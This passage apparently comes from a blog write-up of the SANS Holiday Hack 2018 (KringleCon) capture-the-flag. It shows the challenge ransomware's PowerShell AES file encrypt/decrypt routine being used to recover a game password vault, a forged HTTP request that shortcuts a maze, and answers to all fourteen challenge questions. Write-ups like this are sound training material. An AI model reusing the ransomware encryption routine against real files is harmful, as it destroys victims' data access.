	$AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
	$AESP.BlockSize = 128;
	$AESP.KeySize = $KeySize;
	$AESP.Key = $key;
	$FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);
	if ($enc_it) {
		$DestFile = $File + $Suffix
	} else {
		$DestFile = ($File -replace $Suffix)
	};
	$FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create);
	if ($enc_it) {
		$AESP.GenerateIV();
		$FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4);
		$FileSW.Write($AESP.IV, 0, $AESP.IV.Length);
		$Transform = $AESP.CreateEncryptor()
	} else {
		[Byte[]]$LenIV = New-Object Byte[] 4;
		$FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null;
		$FileSR.Read($LenIV,  0, 3) | Out-Null;
		[Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0);
		[Byte[]]$IV = New-Object Byte[] $LIV;
		$FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null;
		$FileSR.Read($IV, 0, $LIV) | Out-Null;
		$AESP.IV = $IV;
		$Transform = $AESP.CreateDecryptor()
	};
	$CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write);
	[Int]$Count = 0;
	[Int]$BlockSzBts = $AESP.BlockSize / 8;
	[Byte[]]$Data = New-Object Byte[] $BlockSzBts;
	Do {
		$Count = $FileSR.Read($Data, 0, $BlockSzBts);
		$CryptoS.Write($Data, 0, $Count)
	} While ($Count -gt 0);
	$CryptoS.FlushFinalBlock();
	$CryptoS.Close();
	$FileSR.Close();
	$FileSW.Close();
	Clear-variable -Name "key";
	#Remove-Item $File
};

function H2B {param($HX);$HX = $HX -split '(..)' | ? { $_ };ForEach ($value in $HX){[Convert]::ToInt32($value,16)}};

$b_k = $(H2B $key);

e_d_file $b_k "forensic_artifacts\alabaster_passwords.elfdb.wannacookie" $false;
```

After it is run the vault is decrypted. Let's open it:

```
$ sqlite3 alabaster_passwords.elfdb
SQLite version 3.26.0 2018-12-01 12:34:55
Enter ".help" for usage hints.
sqlite> .tables
passwords
sqlite> select * from passwords;
alabaster.snowball|CookiesR0cK!2!#|active directory
alabaster@kringlecastle.com|KeepYourEnemiesClose1425|www.toysrus.com
alabaster@kringlecastle.com|CookiesRLyfe!*26|netflix.com
alabaster.snowball|MoarCookiesPreeze1928|Barcode Scanner
alabaster.snowball|ED#ED#EED#EF#G#F#G#ABA#BA#B|vault
alabaster@kringlecastle.com|PetsEatCookiesTOo@813|neopets.com
alabaster@kringlecastle.com|YayImACoder1926|www.codecademy.com
alabaster@kringlecastle.com|Woootz4Cookies19273|www.4chan.org
alabaster@kringlecastle.com|ChristMasRox19283|www.reddit.com
```

We now have the password to the Santa's vault - ```ED#ED#EED#EF#G#F#G#ABA#BA#B```.


#### Piano Lock

In the room with ransomware challenges there is another door with piano lock. In the previous challenge we saw a tune as one of the passwords.

But when we enter it the lock tells us that it is the right tune, but it must be in D key. That is where we apply the information learned in the piano PDF and manually convert the tune from E to D:

```
DC#DC#DDC#DEF#EF#GAG#AG#A
```

The new tune opens the door!

![]({{ site.baseurl }}/images/sans2018/finish.png)

When we enter the room we see Santa, who tells us that he is the mastermind behind the assult on the Castle:

```
You DID IT! You completed the hardest challenge. You see, Hans and the soldiers work for ME. I had to test you. And you passed the test!

You WON! Won what, you ask? Well, the jackpot, my dear! The grand and glorious jackpot!

You see, I finally found you!

I came up with the idea of KringleCon to find someone like you who could help me defend the North Pole against even the craftiest attackers.

That's why we had so many different challenges this year.

We needed to find someone with skills all across the spectrum.

I asked my friend Hans to play the role of the bad guy to see if you could solve all those challenges and thwart the plot we devised.

And you did!

Oh, and those brutish toy soldiers? They are really just some of my elves in disguise.

See what happens when they take off those hats?

Based on your victory... next year, I'm going to ask for your help in defending my whole operation from evil bad guys.

And welcome to my vault room. Where's my treasure? Well, my treasure is Christmas joy and good will.

You did such a GREAT job! And remember what happened to the people who suddenly got everything they ever wanted?

They lived happily ever after.
```

#### Google Ventilation Maze

![]({{ site.baseurl }}/images/sans2018/maze.png)

The maze is not essential to solving the KringleCon challenges, but it's a fun little additional game. We received the map for the 2 levels of the maze earlier. When you traverse both levels of it you are dropped into the Santa's vault.

Going through the maze manually is a little tedious, so I threw together a quick maze traversing script. Once it reaches the final destination it outputs the "shortcut" request that I could manually drop into an HTTP proxy and shortcut into the destination:

```
POST https://vents.kringlecastle.com/move HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://vents.kringlecastle.com/?challenge=ventmaze&id=78f1e4b9-bb91-4035-87c6-c8f3c229dc55
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Host: vents.kringlecastle.com

heading=s&mazex=23&mazey=7&mazef=2&playeraction=down&locationkey=6d57a75d81f3a589ad68b6022ddb506c&resourceid=7da41aee-3cdd-4b21-9a20-d033290abc91


HTTP/1.1 200 OK
Server: nginx/1.14.1
Date: Wed, 02 Jan 2019 09:01:20 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 277
Connection: keep-alive
Vary: Accept-Encoding

<html><head><script src="./conduit.js"></script><script>__POST_RESULTS__({ hash:"4d6238e5210085fc661708fc890e5d3731dce1c52c8866224682759a880716de", resourceId: "7da41aee-3cdd-4b21-9a20-d033290abc91"});</script></head><body><h1><font color="green">Congratulations!</body></html>
```

## Answering questions

Let's conclude by answering the questions KringleCon posed:

**Question 1:**

_What phrase is revealed when you answer all of the KringleCon Holiday Hack History questions? For hints on achieving this objective, please visit Bushy Evergreen and help him with the Essential Editor Skills Cranberry Pi terminal challenge._

**Answer:** Happy Trails
 
**Question 2:**

_Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? Please analyze the CFP site to find out. For hints on achieving this objective, please visit Minty Candycane and help her with the The Name Game Cranberry Pi terminal challenge._

**Answer:** John McClane
 
**Question 3:**

_The KringleCon Speaker Unpreparedness room is a place for frantic speakers to furiously complete their presentations. The room is protected by a door passcode. Upon entering the correct passcode, what message is presented to the speaker? For hints on achieving this objective, please visit Tangle Coalbox and help him with the Lethal ForensicELFication Cranberry Pi terminal challenge._

**Answer:** Welcome unprepared speaker!
 
**Question 4:**

_Retrieve the encrypted ZIP file from the North Pole Git repository. What is the password to open this file? For hints on achieving this objective, please visit Wunorse Openslae and help him with Stall Mucking Report Cranberry Pi terminal challenge._

**Answer:** Yippee-ki-yay
 
**Question 5:**

_Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What's the user's logon name (in username@domain.tld format)? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge._

**Answer:** LDUBEJ00320@AD.KRINGLECASTLE.COM
 
**Question 6:**

_Bypass the authentication mechanism associated with the room near Pepper Minstix. A sample employee badge is available. What is the access control number revealed by the door authentication panel? For hints on achieving this objective, please visit Pepper Minstix and help her with the Yule Log Analysis Cranberry Pi terminal challenge._

**Answer:** 19880715
 
**Question 7:**

_Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K"? For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge._

**Answer:** Fancy Beaver
 
**Question 8:**

_Santa has introduced a web-based packet capture and analysis tool to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LA Cranberry Pi terminal challenge._

**Answer:** Mary Had a Little Lamb
 
**Question 9:**

_Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. For hints on achieving this objective, please visit Shinny Upatree and help him with the Sleigh Bell Lottery Cranberry Pi terminal challenge. To start, assist Alabaster by accessing (clicking) the snort terminal below. Then create a rule that will catch all new infections. What is the success message displayed by the Snort terminal?_

**Answer:** Congratulation! Snort is alerting on all ransomware and only the ransomware! 
 
**Question 10:**

_After completing the prior question, Alabaster gives you a document he suspects downloads the malware. What is the domain name the malware in the document downloads from?_

**Answer:** Erohetfanu.com
 
**Question 11:**

_Analyze the full malware source code to find a kill-switch and activate it at the North Pole's domain registrar HoHoHo Daddy. What is the full sentence text that appears on the domain registration success message (bottom sentence)?_

**Answer:** Successfully registered yippeekiyaa.aaay!
 
**Question 12:**

_After activating the kill-switch domain in the last question, Alabaster gives you a zip file with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the Vault entry?_

**Answer:** ED#ED#EED#EF#G#F#G#ABA#BA#B
 
**Question 13:**

_Use what you have learned from previous challenges to open the door to Santa's vault. What message do you get when you unlock the door?_

**Answer:** You have unlocked Santa's vault!
 
**Question 14:**

_Who was the mastermind behind the whole KringleCon plan?_

**Answer:** Santa